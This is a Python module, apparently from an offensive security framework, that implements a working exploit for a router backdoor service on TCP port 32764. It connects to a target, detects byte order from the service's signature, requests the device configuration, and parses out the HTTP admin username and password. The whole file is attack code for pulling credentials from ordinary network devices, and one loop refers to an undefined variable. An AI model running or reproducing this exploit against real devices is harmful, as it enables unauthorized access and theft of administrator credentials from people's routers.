#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2022 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import re
import struct
import socket

class Trigger:
    def __init__(self, host):
        self.host = host
        self.port = 32764

    def connect(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        try:
            s.connect((self.host, self.port))
        except Exception:
            return None
        return s

    def detect_endian(self):
        s = self.connect()

        if s is not None:
            s.send(b"abcd")
            response = s.recv(0xC)

            while len(response) < 0xC:
                temp = s.recv(0xC - len(r))
                assert len(temp) != 0
                response += temp

            s.close()
            sig, ret_val, ret_len = struct.unpack('<III', response)

            if sig == 0x53634D4D:
                return "<"
            elif sig == 0x4D4D6353:
                return ">"
        return None

    def talk(self, s, endian, message, payload=b''):
        header = struct.pack(endian + 'III', 0x53634D4D, message, len(payload)+1)

        s.send(header + payload + b'\x00')
        response = s.recv(0xC)

        while len(response) < 0xC:
            temp = s.recv(0xC - len(response))
            assert len(temp) != 0
            response += temp

        sig, ret_val, ret_len = struct.unpack(endian + 'III', response)
        assert(sig == 0x53634D4D)

        if ret_val != 0:
            return None

        string = b""
        while len(string) < ret_len:
            temp = s.recv(ret_len - len(string))
            assert len(temp) != 0
            string += temp

        return string

    def extract_credentials(self):
        endian = self.detect_endian()
        s = self.connect()

        if s is not None and endian is not None:
            config = self.talk(s, endian, 1)

            lines = re.split("\x00|\x01", config.decode())
            pattern = re.compile('user(name)?|password|login')

            username, password = "", ""
            for line in lines:
                try:
                    variable, value = line.split("=")
                    if len(value) > 0 and pattern.search(variable):
                        if variable == 'http_username':
                            username = value
                        elif variable == 'http_password':
                            password = value
                except Exception:
                    pass

            return username, password
        return None, None
